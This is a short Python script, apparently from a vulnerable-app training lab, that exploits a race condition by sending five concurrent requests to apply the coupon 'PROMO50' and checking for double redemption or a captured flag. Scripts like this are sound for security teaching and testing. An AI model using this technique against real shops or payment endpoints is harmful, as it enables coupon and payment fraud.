#!/usr/bin/env python3
"""Replay the race-condition scenario. Standard library only."""
import concurrent.futures
import json
import sys
import urllib.error
import urllib.request

def _post_json(base, path, data):
    url = base.rstrip("/") + path
    payload = json.dumps(data).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=payload,
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b"{}")

def attack(base, level):
    # Reset user 1 first
    _post_json(base, "/api/coupon/reset", {"user_id": 1})

    # Send 5 concurrent coupon requests
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
        futures = [
            ex.submit(_post_json, base, "/api/coupon/apply", {"coupon": "PROMO50", "user_id": 1})
            for _ in range(5)
        ]
        for f in concurrent.futures.as_completed(futures):
            results.append(f.result())

    successes = [r for r in results if r[0] == 200]
    print(f"  Concurrent requests completed: {len(successes)} succeeded out of {len(results)}")

    flag = None
    for _, data in results:
        if "flag" in data:
            flag = data["flag"]
            break

    if flag:
        print(f"  ✓ Race condition exploited! 🚩 Flag: {flag}")
        return True
    elif len(successes) > 1:
        print("  ✓ Coupon applied more than once!")
        return True

    print("  ✗ Race condition not triggered (single redemption enforced)")
    return False

if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    lvl = sys.argv[2] if len(sys.argv) > 2 else "low"
    print(f"[race-condition] {base} level={lvl}")
    sys.exit(0 if attack(base, lvl) else 1)
